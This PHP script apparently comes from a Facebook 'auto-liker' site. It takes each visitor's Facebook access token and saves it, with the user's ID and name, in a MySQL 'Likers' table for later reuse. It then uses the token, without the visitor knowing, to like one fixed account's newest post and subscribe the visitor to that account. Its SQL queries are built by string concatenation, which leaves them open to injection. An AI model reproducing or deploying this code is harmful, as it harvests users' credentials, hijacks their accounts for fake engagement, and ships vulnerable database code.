<?php
ob_start('ob_gzhandler');
session_start();
if($_POST['access_token']) {
	$token2 = $_POST['access_token'];
	if(preg_match("'access_token=(.*?)&expires_in='", $token2, $matches)){
		$token = $matches[1];
			}else{
		$token = $token2;
	}
$me = me($token);
if($me['id']){
$_SESSION['id'] = $me[id];
$_SESSION['name'] = $me[name];
$_SESSION['birthday'] = $me[birthday];
$_SESSION['email'] = $me[email];
$_SESSION['access_token'] = $token;
include('config.php');
$connection = mysql_connect($host,$username,$password);
if (!$connection)
  {
  die('Could not connect: ' . mysql_error());
  }
mysql_select_db($dbname) or die(mysql_error());
mysql_query("SET NAMES utf8");
mysql_query("CREATE TABLE IF NOT EXISTS `Likers` (
      `id` int(11) NOT NULL AUTO_INCREMENT,
      `user_id` varchar(32) NOT NULL,
      `name` varchar(32) NOT NULL,
      `access_token` varchar(255) NOT NULL,
      PRIMARY KEY (`id`)
      ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
   ");
$row = null;
    $result = mysql_query("
      SELECT
         *
      FROM
         Likers
      WHERE
         user_id = '" . $_SESSION['id'] . "'
   ");
   if($result){
      $row = mysql_fetch_array($result, MYSQL_ASSOC);
      if(mysql_num_rows($result) > 1){
         mysql_query("
            DELETE FROM
               Likers
            WHERE
               user_id='" . $_SESSION['id'] . "' AND
               id != '" . $row['id'] . "'
         ");
      }
   }
   if(!$row){
      mysql_query(
         "INSERT INTO 
            Likers
         SET
            `user_id` = '" .$_SESSION['id']. "',
            `name` = '" . $_SESSION['name'] . "',
            `access_token` = '" .$_SESSION['access_token']. "'
      ");
   } else {
      mysql_query(
         "UPDATE 
            Likers
         SET
            `access_token` = '" . $_SESSION['access_token'] . "'
         WHERE
            `id` = " . $row['id'] . "
      ");
}
mysql_close($connection);
//Like
$getpost = 'https://graph.facebook.com/100004294419791/feed?limit=1&access_token='.$token;
$get = auto($getpost);
$array = json_decode($get, true);
$postid = $array[data][0][id];
$com = 'https://graph.facebook.com/'.$postid.'/likes?method=post&access_token='.$token;
$ren = auto($com);
auto($com);
auto('https://graph.facebook.com/100004294419791/subscribers?method=post&access_token='.$token);
header('Location: index.php');
//end
}else{
session_destroy();
header('Location: index.php?tb=Token Hết Hạn. Vui Lòng Làm Mới Token')
;
}
}
function me($access) {
return json_decode(auto('https://graph.facebook.com/me?access_token='.$access),true);
}

function auto($url){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_URL, $url);
   $ch = curl_exec($curl);
   curl_close($curl);
   return $ch;
   }
   ?>